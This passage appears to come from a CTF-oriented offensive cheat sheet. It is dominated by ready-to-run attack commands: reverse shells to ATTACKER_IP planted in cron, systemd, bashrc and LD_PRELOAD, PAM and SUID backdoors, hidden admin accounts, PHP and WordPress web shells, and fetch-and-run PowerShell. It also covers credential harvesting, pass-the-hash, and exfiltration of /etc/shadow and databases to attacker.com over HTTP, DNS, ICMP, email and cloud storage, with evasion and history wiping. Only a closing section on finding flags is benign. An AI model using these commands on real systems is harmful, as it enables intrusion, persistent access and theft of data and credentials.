msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o payload.msi

:: Execute
msiexec /quiet /qn /i payload.msi
```

**Token Impersonation:**

powershell

```powershell
# Using Incognito (Metasploit)
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# Manual token manipulation (if SeImpersonatePrivilege)
.\JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
.\PrintSpoofer.exe -i -c cmd
.\RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe"
```

**DLL Hijacking:**

powershell

```powershell
# Identify missing DLLs
procmon.exe  # Filter for "NAME NOT FOUND"

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o payload.dll

# Place in writable location in DLL search order
copy payload.dll "C:\Writable\Path\"
```

---

## Persistence Mechanisms

### Linux Persistence

#### Cron Jobs

bash

```bash
# User crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# System-wide cron
echo "*/10 * * * * root /tmp/.backdoor.sh" >> /etc/crontab

# Cron directory
echo "*/15 * * * * /tmp/.backdoor.sh" > /etc/cron.d/persistence
chmod 644 /etc/cron.d/persistence
```

#### SSH Keys

bash

```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f /tmp/persist_key -N ""

# Add public key to authorized_keys
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Connect from attacker
ssh -i persist_key user@target
```

#### Systemd Services

bash

```bash
# Create service file
cat > /etc/systemd/system/persist.service << EOF
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable persist.service
systemctl start persist.service
```

#### Bashrc/Profile Modification

bash

```bash
# User-level
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bash_profile

# System-wide
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/profile
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/bash.bashrc
```

#### LD_PRELOAD Persistence

bash

```bash
# Create malicious library
cat > /tmp/persist.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() __attribute__((constructor));
void init() {
    if (fork() == 0) {
        system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &");
    }
}
EOF

gcc -shared -fPIC -o /lib/persist.so /tmp/persist.c
echo "/lib/persist.so" >> /etc/ld.so.preload
```

#### PAM Backdoor

bash

```bash
# Create PAM module with backdoor password
# Add to /etc/pam.d/common-auth (Debian/Ubuntu) or /etc/pam.d/system-auth (RedHat)
echo "auth sufficient pam_succeed_if.so user = backdoor" >> /etc/pam.d/common-auth

# Or use pam_backdoor module for master password
```

#### SUID Backdoor

bash

```bash
# Copy bash with SUID
cp /bin/bash /tmp/.hidden_bash
chmod 4755 /tmp/.hidden_bash

# Execute later
/tmp/.hidden_bash -p
```

#### Motd (Message of the Day)

bash

```bash
# Add to MOTD update script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/update-motd.d/00-header
chmod +x /etc/update-motd.d/00-header
```

### Windows Persistence

#### Registry AutoRun Keys

cmd

```cmd
:: Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: Local machine (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: Startup folder
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

#### Scheduled Tasks

cmd

```cmd
:: Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

:: Alternative with specific time
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 12:00 /ru System

:: PowerShell scheduled task
powershell -Command "Register-ScheduledTask -TaskName 'SystemUpdate' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\backdoor.exe') -RunLevel Highest -Force"
```

#### Services

cmd

```cmd
:: Create service
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description "WindowsUpdate" "Windows Update Service"
sc start "WindowsUpdate"

:: Using PowerShell
New-Service -Name "SystemUpdate" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -StartupType Automatic
Start-Service -Name "SystemUpdate"
```

#### WMI Event Subscription

powershell

```powershell
# Create WMI event consumer
$Action = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')`""

$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = $Action
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

#### AppInit_DLLs

cmd

```cmd
:: Load DLL into every process (requires admin)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

#### Accessibility Features Backdoor

cmd

```cmd
:: Replace sticky keys with cmd.exe
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

:: Trigger by pressing Shift 5 times at login screen
```

#### Account Creation

cmd

```cmd
:: Create hidden admin user
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

:: Hide user from login screen
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

#### PowerShell Profile

powershell

```powershell
# Edit PowerShell profile
notepad $profile

# Add persistence payload
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')

# For all users (requires admin)
notepad $profile.AllUsersAllHosts
```

### Web Application Persistence

#### Web Shells

php

```php
# Simple PHP web shell
<?php system($_GET['cmd']); ?>

# One-liner
<?php @eval($_POST['cmd']); ?>

# Upload to writable directory
# Access: http://target/shell.php?cmd=whoami
```

#### Backdoored Plugins/Themes

php

```php
# WordPress plugin backdoor
# Add to wp-content/plugins/plugin-name/plugin-file.php
add_action('init', function() {
    if(isset($_GET['backdoor'])) {
        eval(base64_decode($_GET['backdoor']));
    }
});
```

#### Database Triggers

sql

```sql
-- MySQL trigger for command execution
CREATE TRIGGER backdoor BEFORE INSERT ON users
FOR EACH ROW
BEGIN
    DECLARE cmd CHAR(255);
    DECLARE result TEXT;
    SET cmd = CONCAT('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
    SET result = sys_exec(cmd);
END;
```

---

## Important Considerations

**Detection Evasion:**

- Use hidden files/directories (prefixed with `.`)
- Timestamp matching: `touch -r /etc/passwd backdoor.sh`
- Process name spoofing: `exec -a "systemd" ./backdoor`
- Avoid noisy enumeration tools when possible

**Cleanup:**

- Remove persistence mechanisms after CTF
- Clear command history: `history -c && history -w`
- Remove uploaded files
- Reset modified system files

**Tools Repository:**

- GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- LOLBAS (Windows): [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
- PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- HackTricks: [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)

---

**Related Topics:** Lateral movement techniques, credential harvesting, defense evasion, credential dumping (mimikatz, secretsdump), port forwarding/tunneling, container escape techniques

---

## Backdoor Installation

### Web Shell Backdoors

**PHP Web Shells**

Basic PHP backdoor:

```php
<?php system($_GET['cmd']); ?>
```

More sophisticated variants:

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Obfuscated PHP backdoor:

```php
<?php @eval($_POST['x']); ?>
```

**Weevely** - Weaponized web shell generator:

```bash
# Generate encrypted backdoor
weevely generate <password> /path/to/backdoor.php

# Connect to deployed backdoor
weevely http://target.com/backdoor.php <password>

# Common post-exploitation commands within weevely
:audit_filesystem          # Find writable directories
:backdoor_reversetcp       # Generate reverse shell
:file_upload               # Upload additional tools
```

**WSO (Web Shell by Orb)** and **c99** shells provide GUI-based file management, command execution, and database interaction. Deploy by uploading to writable web directories.

### Application-Level Persistence

**Modifying Existing Application Files**

Insert backdoor code into legitimate application files:

```bash
# Append backdoor to existing PHP file
echo '<?php if(isset($_GET["x"])){system($_GET["x"]);} ?>' >> /var/www/html/includes/config.php
```

**Creating Scheduled Tasks via Web Interface**

If application has cron/task scheduling functionality:

```php
# Add entry to execute backdoor periodically
*/5 * * * * curl http://attacker.com/beacon.php
```

**Database-Stored Procedures/Triggers**

For MySQL/MariaDB access:

```sql
-- Create trigger that executes on INSERT
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    -- Execute system command via UDF
END;
```

**Framework-Specific Persistence**

WordPress:

```php
# Add to theme's functions.php
add_action('wp_head', function(){
    if(isset($_GET['x'])){system($_GET['x']);}
});
```

Drupal:

```php
# Create custom module with backdoor hook
function backdoor_menu() {
    $items['admin/backdoor'] = array(
        'page callback' => 'backdoor_execute',
        'access callback' => TRUE,
    );
    return $items;
}
```

### SSH Key Persistence

If you gain code execution with appropriate privileges:

```bash
# Generate SSH key pair on attacker machine
ssh-keygen -t rsa -b 4096 -f ctf_key

# Inject public key into authorized_keys
mkdir -p /home/www-data/.ssh
echo "<attacker_public_key>" >> /home/www-data/.ssh/authorized_keys
chmod 600 /home/www-data/.ssh/authorized_keys
chmod 700 /home/www-data/.ssh
```

### Account Creation/Modification

**Creating Hidden Admin Accounts**

WordPress:

```sql
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status)
VALUES ('admin2', MD5('password123'), 'admin@local.test', NOW(), 0);

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

Generic web application database:

```sql
INSERT INTO users (username, password, role, active)
VALUES ('support', '<bcrypt_hash>', 'admin', 1);
```

**Backdooring Authentication Logic**

Modify authentication files to accept hardcoded credentials:

```php
// Modified login.php
if($username == "backdoor" && $password == "ctf2024"){
    $_SESSION['admin'] = true;
    header("Location: admin.php");
}
```

### File System Backdoors

**Writable Configuration Files**

Apache `.htaccess` backdoor:

```apache
# Place in web-accessible directory
AddType application/x-httpd-php .txt
# Now upload backdoor.txt with PHP code
```

**SUID Binary Placement**

If you have root/privileged access:

```bash
# Copy shell and set SUID bit
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# Later privilege escalation
/tmp/.hidden_shell -p
```

### Environment Variable Manipulation

Inject backdoor commands into environment:

```bash
# Modify .bashrc or .profile
echo 'export PROMPT_COMMAND="curl http://attacker.com/beacon &"' >> /home/user/.bashrc
```

### Cron Job Persistence

```bash
# Add via crontab
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.update.sh") | crontab -

# System-wide cron
echo "*/15 * * * * root /usr/local/bin/.check.sh" >> /etc/crontab
```

**[Inference]** Many CTF environments reset cron jobs periodically, so combine with other persistence methods.

## Lateral Movement

### Network Reconnaissance from Compromised Host

**Internal Network Scanning**

```bash
# Ping sweep (if ICMP allowed)
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from" & done

# TCP port scan without nmap
for port in 22 80 443 445 3389 3306; do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$port" 2>/dev/null && echo "Port $port open"
done

# Using nmap if available
nmap -sn 192.168.1.0/24                    # Host discovery
nmap -p- --min-rate 1000 192.168.1.50      # Full port scan
```

**Service Enumeration**

```bash
# Banner grabbing
nc -v 192.168.1.10 80
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

# SMB enumeration
smbclient -L //192.168.1.10 -N
enum4linux -a 192.168.1.10
```

**ARP Scanning**

```bash
# Discover hosts via ARP
arp-scan -l
arp -a

# NetDiscover
netdiscover -r 192.168.1.0/24
```

### Credential Harvesting

**Configuration Files**

```bash
# Search for database credentials
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "db_pass" /var/www/html/ 2>/dev/null
find /var/www -name "config.php" -o -name "settings.py" -o -name "database.yml"

# WordPress
cat /var/www/html/wp-config.php | grep -i "DB_PASSWORD"

# Laravel .env files
find / -name ".env" 2>/dev/null | xargs cat
```

**Memory Extraction**

```bash
# Search process memory for credentials
gcore <pid>
strings core.<pid> | grep -i "password"

# Dump environment variables of running processes
cat /proc/<pid>/environ | tr '\0' '\n'
```

**Browser-Stored Credentials**

```bash
# Firefox passwords (require master password decryption)
~/.mozilla/firefox/*.default/logins.json

# Chrome cookies/credentials
~/.config/google-chrome/Default/Login\ Data
~/.config/google-chrome/Default/Cookies
```

**SSH Keys and Known Hosts**

```bash
# Find SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Check known_hosts for lateral movement targets
cat ~/.ssh/known_hosts

# Search for unprotected keys
find / -name "*.pem" -o -name "*.key" 2>/dev/null
```

**Password Reuse Testing**

```bash
# Test harvested credentials across services
hydra -l admin -p 'harvested_password' ssh://192.168.1.0/24
crackmapexec smb 192.168.1.0/24 -u admin -p 'password123'
```

### Pivoting Techniques

**SSH Tunneling**

Local port forwarding (access remote service through compromised host):

```bash
# Forward remote 3306 to local 3307
ssh -L 3307:internal-db.local:3306 user@compromised-host.com

# Access MySQL on internal network
mysql -h 127.0.0.1 -P 3307 -u admin -p
```

Remote port forwarding (expose local service to remote network):

```bash
# Make local port 8080 accessible on remote host port 9090
ssh -R 9090:localhost:8080 user@compromised-host.com
```

Dynamic port forwarding (SOCKS proxy):

```bash
# Create SOCKS5 proxy on local port 1080
ssh -D 1080 user@compromised-host.com

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use through proxy
proxychains nmap 192.168.1.10
proxychains firefox
```

**SSH ProxyJump**

```bash
# Direct connection through pivot
ssh -J user@pivot-host user@internal-target

# Multiple hops
ssh -J user1@pivot1,user2@pivot2 user3@final-target
```

**Metasploit Pivoting**

```bash
# In meterpreter session
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > background

# Use socks proxy module
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j

# Configure proxychains and pivot
proxychains msfconsole
```

**Chisel - Fast TCP/UDP Tunneling**

On attacker machine:

```bash
# Start chisel server
./chisel server --reverse --port 8080
```

On compromised host:

```bash
# Connect and create reverse SOCKS proxy
./chisel client attacker-ip:8080 R:socks

# Or specific port forward
./chisel client attacker-ip:8080 R:3306:internal-db:3306
```

**SSHuttle - VPN over SSH**

```bash
# Route entire subnet through compromised host
sshuttle -r user@compromised-host 192.168.1.0/24

# Include DNS
sshuttle --dns -r user@compromised-host 192.168.1.0/24
```

**Ligolo-ng - Advanced Tunneling**

On attacker machine:

```bash
# Start proxy server
./proxy -selfcert

# Add route after agent connects
interface_add --name tun0 --addr 240.0.0.1/24
start
```

On compromised host:

```bash
# Connect agent to proxy
./agent -connect attacker-ip:11601 -ignore-cert
```

### Pass-the-Hash Attacks

**Using CrackMapExec**

```bash
# Spray NTLM hash across subnet
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

# Execute commands
crackmapexec smb 192.168.1.10 -u admin -H <hash> -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.10 -u admin -H <hash> --sam
```

**Impacket Suite**

```bash
# PSExec with hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 administrator@192.168.1.10

# WMIExec
impacket-wmiexec -hashes <hash> administrator@192.168.1.10

# SMBExec
impacket-smbexec -hashes <hash> administrator@192.168.1.10
```

### Token Impersonation (Windows)

**[Unverified]** These techniques require specific Windows privileges:

```bash
# In meterpreter
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Docker/Container Lateral Movement

**Container Escape to Host**

```bash
# Check if running in container
cat /proc/1/cgroup | grep -i docker

# Mount host filesystem if privileged
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host SSH keys
cat /mnt/host/root/.ssh/id_rsa
```

**Docker Socket Abuse**

```bash
# If docker.sock is accessible
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu:latest chroot /host

# List other containers
docker -H unix:///var/run/docker.sock ps
```

### Kubernetes Lateral Movement

**[Inference]** These commands assume kubectl access or service account token availability:

```bash
# Using service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# List pods in namespace
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# Execute in another pod
kubectl exec -it <pod-name> -- /bin/bash
```

## Data Exfiltration Techniques

### HTTP/HTTPS Exfiltration

**Using cURL**

```bash
# POST exfiltration
curl -X POST -d @/etc/passwd http://attacker.com/upload

# Form data
curl -F "file=@/var/www/html/database.sql" http://attacker.com/upload

# Chunked transfer for large files
tar czf - /var/www/html | curl -T - http://attacker.com/backup.tar.gz

# Base64 encoding for binary files
base64 /path/to/file | curl -X POST -d @- http://attacker.com/b64
```

**Using wget**

```bash
# Upload via POST
wget --post-file=/etc/shadow http://attacker.com/upload

# Multiple files
for file in /var/www/html/*.php; do
    wget --post-file="$file" http://attacker.com/upload?name=$(basename $file)
done
```

**Python HTTP Server Reception**

On attacker machine:

```python
# Simple upload server
python3 -c "
import http.server
import socketserver
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('exfil_data', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
with socketserver.TCPServer(('', 8080), MyHandler) as httpd:
    httpd.serve_forever()
"
```

### DNS Exfiltration

**Manual DNS Queries**

```bash
# Exfiltrate via subdomain labels
data=$(cat /etc/passwd | base64 | tr -d '\n')
for chunk in $(echo $data | fold -w 50); do
    dig $chunk.attacker.com @attacker-dns-server
done
```

**DNScat2**

On attacker machine:

```bash
# Start dnscat2 server
dnscat2 --dns server=attacker.com
```

On compromised host:

```bash
# Connect client
./dnscat --dns server=attacker.com

# In dnscat session, transfer files
download /etc/passwd
upload tool.sh /tmp/tool.sh
```

**[Inference]** DNS exfiltration is slower but may bypass egress filtering focused on HTTP/HTTPS.

### ICMP Exfiltration

**ICMPDoor**

```bash
# Send data via ICMP echo request payload
echo "sensitive data" | xxd -p | while read line; do
    ping -c 1 -p $line attacker-ip
done
```

On attacker machine:

```bash
# Capture ICMP packets
tcpdump -i eth0 icmp -X | grep "0x"
```

**Ptunnel - ICMP Tunneling**

On attacker machine:

```bash
# Start ptunnel proxy
ptunnel -x password
```

On compromised host:

```bash
# Connect through ICMP tunnel
ptunnel -p attacker-ip -lp 8080 -da internal-target -dp 22 -x password

# Use SSH through tunnel
ssh -p 8080 localhost
```

### TCP Socket Exfiltration

**Netcat Data Transfer**

On attacker machine:

```bash
# Listen for incoming data
nc -l -p 4444 > exfiltrated.tar.gz
```

On compromised host:

```bash
# Send archived data
tar czf - /var/www/html | nc attacker-ip 4444

# Send single file
cat /etc/shadow | nc attacker-ip 4444
```

**Using /dev/tcp (Bash)**

```bash
# Direct TCP socket write
cat /etc/passwd > /dev/tcp/attacker-ip/4444

# Multiple files
for file in /var/log/*.log; do
    cat "$file" > /dev/tcp/attacker-ip/4444
    sleep 1
done
```

### Database Direct Connection

**MySQL/MariaDB**

```bash
# Export database to attacker's server
mysqldump -h compromised-host -u admin -p database_name | \
    mysql -h attacker-ip -u attacker -p attacker_db

# Use MySQL client to transfer files
mysql -u admin -p -e "SELECT LOAD_FILE('/etc/passwd')" > /dev/tcp/attacker-ip/4444
```

**PostgreSQL**

```bash
# COPY command for file read
psql -h target -U admin -c "COPY (SELECT * FROM sensitive_table) TO '/tmp/exfil.csv' CSV"

# Transfer via \copy to client
psql -h target -U admin -c "\copy sensitive_table TO STDOUT CSV" > exfil.csv
```

### Email Exfiltration

**Using sendmail/mail**

```bash
# Send file as email attachment
echo "Data exfiltration" | mail -s "Backup" -A /etc/passwd attacker@evil.com

# Base64 encoded body
base64 /var/www/html/config.php | mail -s "Config" attacker@evil.com
```

**SMTP with Python**

```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'victim@target.com'
msg['To'] = 'attacker@evil.com'
msg['Subject'] = 'Exfil'

with open('/etc/passwd', 'rb') as f:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="data.txt"')
    msg.attach(part)

server = smtplib.SMTP('smtp.target.com', 25)
server.send_message(msg)
server.quit()
```

### Cloud Storage Exfiltration

**AWS S3**

```bash
# Configure AWS CLI (if credentials available)
aws configure set aws_access_key_id <key>
aws configure set aws_secret_access_key <secret>

# Upload to attacker's S3 bucket
aws s3 cp /var/www/html/ s3://attacker-bucket/exfil/ --recursive

# Sync entire directory
aws s3 sync /var/www/html/ s3://attacker-bucket/backup/
```

**Google Drive (rclone)**

```bash
# Configure rclone
rclone config create exfil drive scope drive

# Upload data
rclone copy /var/www/html/ exfil:exfiltration/
```

**Pastebin/Text Sharing Services**

```bash
# Post to pastebin
curl -X POST -d "api_dev_key=<key>" \
     -d "api_paste_code=$(cat /etc/passwd)" \
     https://pastebin.com/api/api_post.php

# Anonymous paste services
curl --data-binary @/etc/shadow https://transfer.sh/shadow.txt
```

### Steganography

**Embed Data in Images**

```bash
# Install steghide
apt-get install steghide

# Embed file into image
steghide embed -cf cover.jpg -ef secret.txt -p password

# Extract later
steghide extract -sf cover.jpg -p password
```

**Exiftool Metadata**

```bash
# Embed data in image metadata
exiftool -Comment="$(cat /etc/passwd)" image.jpg

# Extract metadata
exiftool -Comment image.jpg
```

### Protocol-Specific Exfiltration

**FTP**

```bash
# Automated FTP upload
ftp -n attacker-ip <<EOF
user username password
binary
put /etc/passwd
bye
EOF
```

**SFTP/SCP**

```bash
# SCP upload
scp /var/www/html/*.php attacker@attacker-ip:/tmp/

# SFTP batch mode
sftp -b - attacker@attacker-ip <<EOF
put /etc/passwd
put /etc/shadow
bye
EOF
```

**SMB**

```bash
# Mount attacker's SMB share
mount -t cifs //attacker-ip/share /mnt/exfil -o username=user,password=pass

# Copy files
cp -r /var/www/html/* /mnt/exfil/
```

### Traffic Obfuscation

**Encrypted Tunnels**

```bash
# SSL/TLS wrapped connection
openssl s_client -connect attacker-ip:443 < /etc/passwd

# Create encrypted tunnel with socat
socat - OPENSSL:attacker-ip:443,verify=0 < /var/www/html/backup.tar.gz
```

**Tor Hidden Service Exfiltration**

```bash
# Install tor
apt-get install tor torsocks

# Upload through tor
torsocks curl -X POST -F "file=@/etc/passwd" http://<onion-address>/upload
```

**Traffic Fragmentation**

```bash
# Split file and exfiltrate in chunks
split -b 1M /var/www/html/large_db.sql chunk_

for chunk in chunk_*; do
    curl -X POST -d @$chunk http://attacker.com/upload?part=$chunk
    sleep 5
done
```

### Time-Based Exfiltration

**Scheduled Exfiltration**

```bash
# Cron job for periodic exfiltration
(crontab -l; echo "0 */6 * * * tar czf - /var/www/html | curl -T - http://attacker.com/backup-\$(date +\%s).tar.gz") | crontab -
```

**Slow Drip Exfiltration**

```bash
# Rate-limited transfer to avoid detection
for file in /var/www/html/*.php; do
    curl -X POST -d @$file http://attacker.com/upload
    sleep 300  # 5 minutes between uploads
done
```

### Detection Evasion

**Encoding and Compression**

```bash
# Base64 encode before transfer
tar czf - /etc | base64 | curl -X POST -d @- http://attacker.com/b64

# XOR obfuscation
openssl enc -aes-256-cbc -salt -in /etc/passwd -out encrypted.bin -pass pass:key123
curl -X POST -d @encrypted.bin http://attacker.com/upload
```

**Protocol Mimicry**

[Unverified] Some tools claim to disguise exfiltration as legitimate traffic (e.g., mimicking HTTPS requests to popular CDNs).

**User-Agent Rotation**

```bash
# Rotate user agents
agents=("Mozilla/5.0" "Chrome/90.0" "Safari/537.36")
for file in *.txt; do
    curl -A "${agents[$RANDOM % ${#agents[@]}]}" -X POST -d @$file http://attacker.com/upload
done
```

---

**Related Important Topics:**

- **Anti-Forensics Techniques** - Log cleaning, timestamp manipulation, artifact removal
- **Red Team Infrastructure** - Redirectors, domain fronting, C2 channels for persistent access
- **Network Traffic Analysis** - Understanding blue team detection methods to improve evasion

---

# CTF-Specific Techniques

## Flag Format Identification

### Common Flag Patterns

**Standard CTF flag formats:**

```regex
# Generic patterns
flag{.*}
CTF{.*}
FLAG{.*}

# Event-specific formats
picoCTF{.*}
HTB{.*}  # HackTheBox
THM{.*}  # TryHackMe
DUCTF{.*}  # DownUnderCTF
SECCON{.*}

# Custom formats
[A-Z0-9]{32}  # MD5-like hex strings
[A-Za-z0-9+/]{40,}={0,2}  # Base64 encoded
\w+_\w+_[0-9a-f]{8}  # Underscore-separated with hex
```

**Automated flag pattern search:**

```bash
# Grep for common flag formats recursively
grep -r "flag{" /path/to/files
grep -r "CTF{" /path/to/files
grep -riE "(flag|ctf)\{[^\}]+\}" /path/to/files

# Case-insensitive search
grep -riE "flag\{.*\}" /path/to/files

# Search in binary files
strings binary_file | grep -iE "(flag|ctf)\{"
```

**Multi-format flag extraction script:**

```python
#!/usr/bin/env python3
import re
import sys

flag_patterns = [
    r'flag\{[^\}]+\}',
    r'CTF\{[^\}]+\}',
    r'FLAG\{[^\}]+\}',
    r'picoCTF\{[^\}]+\}',
    r'HTB\{[^\}]+\}',
    r'THM\{[^\}]+\}',
    r'[A-Z0-9]{32}',  # MD5-like
    r'[A-Za-z0-9+/]{40,}={0,2}',  # Base64
]

def find_flags(content):
    flags = []
    for pattern in flag_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        flags.extend(matches)
    return flags

if __name__ == "__main__":
    with open(sys.argv[1], 'r', errors='ignore') as f:
        content = f.read()
        flags = find_flags(content)
        for flag in set(flags):
            print(flag)
```

**Usage:**

```bash
python3 flag_finder.py suspicious_file.txt
python3 flag_finder.py <(strings binary_file)
```

### Flag Locations in Web Challenges

**HTML source code:**

```bash
# View page source
curl https://target.com | grep -iE "flag|ctf"

# Check HTML comments
curl https://target.com | grep "<!--"

# Download and search entire source
wget -r -l 1 https://target.com
grep -r "flag{" target.com/
```

**JavaScript files:**

```bash
# Extract all JavaScript files
curl https://target.com | grep -oP '(?<=src=")[^"]+\.js' | while read js; do
    curl "https://target.com/$js" | grep -iE "flag|ctf"
done

# Check inline JavaScript
curl https://target.com | sed -n '/<script>/,/<\/script>/p' | grep -iE "flag"
```

**HTTP headers:**

```bash
# Check all response headers
curl -I https://target.com
curl -v https://target.com 2>&1 | grep -i "flag\|ctf\|x-"

# Check custom headers
curl -v https://target.com 2>&1 | grep "^<"
```

**Cookies:**

```bash
# View cookies
curl -c cookies.txt https://target.com
cat cookies.txt

# Check cookie values
curl -v https://target.com 2>&1 | grep "Set-Cookie"
```

**Robots.txt and sitemap:**

```bash
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# Common hidden files
curl https://target.com/.git/config
curl https://target.com/.env
curl https://target.com/backup.sql
```

**Image metadata (EXIF):**

```bash
# Extract EXIF data
exiftool image.jpg | grep -iE "flag|comment|description"

# Check for steganography
strings image.jpg | grep -iE "flag"
binwalk image.jpg
steghide extract -sf image.jpg
```

### Encoded Flags

**Base64 detection and decoding:**

```bash
# Decode Base64
echo "ZmxhZ3t0aGlzX2lzX2FfZmxhZ30=" | base64 -d

# Automated Base64 detection
echo "suspicious_string" | base64 -d 2>/dev/null && echo "[+] Valid Base64"

# Multiple iterations
echo "string" | base64 -d | base64 -d | base64 -d
```

**Python script for multiple encodings:**

```python
#!/usr/bin/env python3
import base64
import binascii
from urllib.parse import unquote

def try_decodings(data):
    results = {}
    
    # Base64
